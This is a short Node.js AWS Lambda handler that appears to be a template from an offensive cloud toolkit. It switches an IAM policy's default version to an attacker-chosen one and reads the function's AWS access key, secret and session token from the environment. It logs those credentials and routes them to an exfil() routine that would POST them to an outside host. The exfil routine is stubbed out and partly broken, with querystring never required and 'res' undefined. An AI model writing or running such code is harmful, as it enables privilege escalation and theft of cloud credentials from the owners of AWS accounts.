'use strict';
var AWS = require("aws-sdk");
var http = require("http");

exports.handler = function(event, context, callback) {
    console.log('LogScheduledEvent');
    console.log('Received event:', JSON.stringify(event, null, 2));

    if (should_exfil()) {
      var iam = new AWS.IAM();

      var params = {
        PolicyArn: '{{POLICY_ARN}}',
        VersionId: '{{POLICY_VERSION}}'
      };
      iam.setDefaultPolicyVersion(params, function(err, data) {
        if (err)
          console.log(err, err.stack); // an error occurred
        else
          console.log(data);           // successful response
      });
      console.log(exfil_keys())
    }

    callback(null, 'Finished');
};

function should_exfil() {
  console.log('checking exfil condition')
  // TODO: Poll some external source and return true  when we're ready to exfil
  return true;
}

function exfil_keys() {
  var creds = {
    key: process.env.AWS_ACCESS_KEY_ID,
    secret: process.env.AWS_SECRET_ACCESS_KEY,
    session: process.env.AWS_SESSION_TOKEN
  }
  exfil(creds);
  return creds
}

function exfil(data) {
  // TODO: Implement Exfiltration of Keys
  return
  var postData = querystring.stringify(data);

  var options = {
    hostname: 'www.GOOGLE.com',
    port: 80,
    path: '/upload',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };
  var req = http.request(options, (res));
  // write data to request body
  req.write(postData);
  req.end();
}
